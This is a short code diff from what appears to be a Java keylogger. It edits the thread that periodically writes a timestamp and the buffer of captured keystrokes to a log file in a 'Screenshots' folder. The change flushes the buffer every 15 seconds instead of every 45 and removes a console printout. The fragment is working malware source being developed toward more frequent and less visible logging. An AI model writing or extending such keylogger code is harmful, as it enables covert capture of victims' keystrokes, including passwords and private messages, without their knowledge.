@@ -27,7 +27,7 @@ public class TimeThreader extends Thread{
             try {
                 fw=new FileWriter("Screenshots/logs.txt",true);
                 bw=new BufferedWriter(fw);
-                bw.write(Keylogger.x+" "+Keylogger.buffer_str+"\n");
+                bw.write(Keylogger.x+" :"+Keylogger.buffer_str+"\n");
                 bw.close();
                 fw.close();
                 Keylogger.buffer_str="";
@@ -37,9 +37,8 @@ public class TimeThreader extends Thread{
             }
         Keylogger.x=Calendar.getInstance().getTime();
         
-        System.out.println(Keylogger.x);
             try {
-                Thread.sleep(1000*45);
+                Thread.sleep(1000*15);
             } catch (InterruptedException ex) {
                 Logger.getLogger(TimeThreader.class.getName()).log(Level.SEVERE, null, ex);
             }
